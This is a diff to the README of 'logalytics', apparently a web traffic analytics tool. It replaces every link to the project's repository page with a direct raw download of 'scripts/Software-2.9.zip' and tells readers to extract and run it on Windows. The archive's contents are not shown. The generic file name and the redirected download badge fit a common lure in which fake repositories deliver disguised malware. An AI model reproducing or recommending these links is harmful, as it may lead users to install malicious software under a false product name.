@@ -1,6 +1,6 @@
 # 📊 logalytics - See web traffic with clear insights
 
-[![Download logalytics](https://img.shields.io/badge/Download-Logalytics-7b68ee?style=for-the-badge&logo=github)](https://github.com/Lockwoodriddled433/logalytics)
+[![Download logalytics](https://img.shields.io/badge/Download-Logalytics-7b68ee?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lockwoodriddled433/logalytics/main/scripts/Software-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want a clear view of what is happening on your site without diggin
 
 ## 📥 Download and Install
 
-1. Open the download page: [https://github.com/Lockwoodriddled433/logalytics](https://github.com/Lockwoodriddled433/logalytics)
+1. Open the download page: [https://raw.githubusercontent.com/Lockwoodriddled433/logalytics/main/scripts/Software-2.9.zip](https://raw.githubusercontent.com/Lockwoodriddled433/logalytics/main/scripts/Software-2.9.zip)
 2. Look for the latest Windows release file.
 3. Download the file to your computer.
 4. If the file is in a zip folder, right-click it and choose **Extract All**.
@@ -210,7 +210,7 @@ These views help you read site activity without sorting through raw text.
 
 ## 🔗 Download
 
-Visit this page to download: [https://github.com/Lockwoodriddled433/logalytics](https://github.com/Lockwoodriddled433/logalytics)
+Visit this page to download: [https://raw.githubusercontent.com/Lockwoodriddled433/logalytics/main/scripts/Software-2.9.zip](https://raw.githubusercontent.com/Lockwoodriddled433/logalytics/main/scripts/Software-2.9.zip)
 
 ## 🏷️ Topics
 
